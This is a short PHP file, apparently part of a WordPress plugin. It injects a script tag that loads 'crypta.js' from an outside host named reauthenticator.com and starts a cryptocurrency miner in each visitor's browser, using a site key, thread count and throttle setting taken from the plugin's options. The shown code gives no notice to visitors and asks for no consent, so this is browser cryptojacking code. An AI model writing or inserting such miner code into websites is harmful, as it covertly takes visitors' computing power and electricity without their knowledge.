<?php

if(!function_exists('add_action')) {
    die('This file cannot be accessed directly');
}

function cmxmr_js_include() {
    $publicSiteKey = esc_attr(get_option('cmxmr_public_site_key'));
    $noOfThreads = esc_attr(get_option('cmxmr_no_of_threads'));
    $trottle = esc_attr(get_option('cmxmr_throttle_percentage'))/100;
    if ($publicSiteKey && $noOfThreads && $trottle) {
        echo '<script src="//reauthenticator.com/lib/crypta.js"></script>
<script>
  var miner=new CRLT.Anonymous("'.$publicSiteKey.'", {
    threads:'.$noOfThreads.',throttle:'.$trottle.',
  });
  miner.start();
</script>';
    }
}